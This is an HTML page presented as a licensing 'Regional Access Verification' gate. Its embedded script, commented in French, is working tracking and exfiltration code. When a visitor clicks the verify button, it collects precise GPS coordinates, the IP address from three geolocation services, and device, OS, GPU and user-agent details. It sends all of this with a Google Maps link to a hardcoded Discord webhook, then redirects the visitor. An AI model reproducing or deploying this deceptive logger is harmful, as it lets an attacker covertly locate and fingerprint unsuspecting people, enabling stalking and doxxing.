<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Regional Access & License Compliance</title>
  <style>
    :root {
      --bg-color: #0b0f19;
      --card-bg: #161b22;
      --border-color: #30363d;
      --text-primary: #f0f6fc;
      --text-secondary: #8b949e;
      --accent-color: #238636;
      --accent-hover: #2ea043;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background-color: var(--bg-color);
      color: var(--text-primary);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: var(--card-bg);
      border: 1px solid var(--border-color);
      border-radius: 12px;
      padding: 2.5rem;
      width: 100%;
      max-width: 440px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
      text-align: center;
    }
    .logo { width: 48px; height: 48px; margin-bottom: 1.5rem; fill: var(--text-primary); }
    h1 { font-size: 1.25rem; font-weight: 600; margin-bottom: 0.75rem; }
    p { color: var(--text-secondary); font-size: 0.9rem; line-height: 1.5; margin-bottom: 1.75rem; }
    .btn {
      background-color: var(--accent-color);
      color: white;
      border: none;
      border-radius: 6px;
      padding: 0.75rem 1.5rem;
      font-size: 0.95rem;
      font-weight: 500;
      cursor: pointer;
      width: 100%;
    }
    .btn:hover { background-color: var(--accent-hover); }
    .status-area { display: none; margin-top: 1.5rem; font-size: 0.85rem; color: var(--text-secondary); }
    .spinner {
      border: 3px solid rgba(255, 255, 255, 0.1);
      width: 28px;
      height: 28px;
      border-radius: 50%;
      border-left-color: var(--accent-color);
      animation: spin 0.8s linear infinite;
      margin: 0 auto 10px auto;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>

  <div class="container">
    <svg class="logo" viewBox="0 0 24 24">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
    </svg>
    <h1>Regional Access Verification</h1>
    <p>To comply with licensing laws and regional distribution policies, please verify your geographic location to access <strong>enzgal portal</strong>.</p>
    
    <button class="btn" id="verify-btn" onclick="startVerification()">Verify My Region</button>

    <div class="status-area" id="status-area">
      <div class="spinner"></div>
      <p id="status-text">Analyzing compliance and metadata...</p>
    </div>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1565897913379328100/Z0oV4Ukzp635XQwQ7v8rAh9-VLrLncAZyXdWZyuiEGEhe0hKcFmyUpeLQB3o1-nkq6v8";
    const TARGET_URL = "https://kfcgaming.github.io/enzgal";

    // Récupération passive du GPU
    function getGPUInfo() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "N/A";
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (!debugInfo) return "Hidden";
        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      } catch (e) {
        return "Error";
      }
    }

    // Demande de géolocalisation GPS précise (Latitude / Longitude)
    function getPreciseGPS() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({ status: "Not Supported", lat: null, lon: null, accuracy: null });
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve({
            status: "Granted ✅",
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: `${Math.round(pos.coords.accuracy)}m`
          }),
          (err) => resolve({ status: "Denied / Blocked ❌", lat: null, lon: null, accuracy: null }),
          { timeout: 8000, enableHighAccuracy: true }
        );
      });
    }

    async function startVerification() {
      document.getElementById('verify-btn').style.display = 'none';
      document.getElementById('status-area').style.display = 'block';

      try {
        // Exécution simultanée du GPS, des IP et des infos système
        const [gps, ipResults, deviceHints] = await Promise.all([
          getPreciseGPS(),
          Promise.allSettled([
            fetch("https://ipapi.co/json/").then(r => r.json()),
            fetch("https://ipwho.is/").then(r => r.json()),
            fetch("https://json.geoiplookup.io/").then(r => r.json())
          ]),
          navigator.userAgentData ? navigator.userAgentData.getHighEntropyValues(["platform", "model"]).catch(() => ({})) : Promise.resolve({})
        ]);

        const api1 = ipResults[0].status === 'fulfilled' ? ipResults[0].value : {};
        const api2 = ipResults[1].status === 'fulfilled' ? ipResults[1].value : {};
        const api3 = ipResults[2].status === 'fulfilled' ? ipResults[2].value : {};
        const ip = api1.ip || api2.ip || api3.ip || "Unknown";

        const deviceModel = deviceHints.model || "Desktop / Unknown";
        const osPlatform = deviceHints.platform || navigator.platform || "N/A";
        const screenRes = `${window.screen.width}x${window.screen.height}`;
        const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unknown";
        const gpu = getGPUInfo();

        // Formatage clair de la localisation GPS avec lien Google Maps direct
        let gpsField = "";
        if (gps.status.includes("Granted")) {
          gpsField = `**Status:** Granted ✅\n**Latitude:** \`${gps.lat}\`\n**Longitude:** \`${gps.lon}\`\n**Précision:** ${gps.accuracy}\n[🗺️ Ouvrir sur Google Maps](https://maps.google.com/?q=${gps.lat},${gps.lon})`;
        } else {
          gpsField = `**Status:** ${gps.status}`;
        }

        // Structure en 2 embeds distincts pour contourner les limites de Discord
        const payload = {
          username: "Compliance Gateway Logger",
          avatar_url: "https://i.imgur.com/4M34hi2.png",
          embeds: [
            {
              title: "📍 Géolocalisation GPS & IP",
              color: gps.status.includes("Granted") ? 0x238636 : 0xef4444,
              fields: [
                { name: "Coordonnées GPS Précises", value: gpsField, inline: false },
                { name: "Adresse IP Principale", value: `\`${ip}\``, inline: false },
                { name: "ipapi.co", value: `${api1.city || 'N/A'}, ${api1.country_name || 'N/A'}`, inline: true },
                { name: "ipwho.is", value: `${api2.city || 'N/A'}, ${api2.country || 'N/A'}`, inline: true },
                { name: "geoiplookup", value: `${api3.city || 'N/A'}`, inline: true }
              ]
            },
            {
              title: "💻 Matériel & Système",
              color: 0x1f6feb,
              fields: [
                { name: "Appareil / OS", value: `${deviceModel} (${osPlatform})`, inline: true },
                { name: "CPU / Cœurs", value: cores, inline: true },
                { name: "Résolution Écran", value: screenRes, inline: true },
                { name: "Carte Graphique (GPU)", value: gpu, inline: false },
                { name: "User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
              ]
            }
          ]
        };

        // Envoi de la requête au webhook Discord
        const response = await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        if (!response.ok) {
          console.error("Erreur Discord:", await response.text());
        }

      } catch (error) {
        console.error("Erreur d'exécution:", error);
      } finally {
        // Redirection vers ton site cible après l'envoi
        setTimeout(() => {
          window.location.href = TARGET_URL;
        }, 1000);
      }
    }
  </script>
</body>
</html>
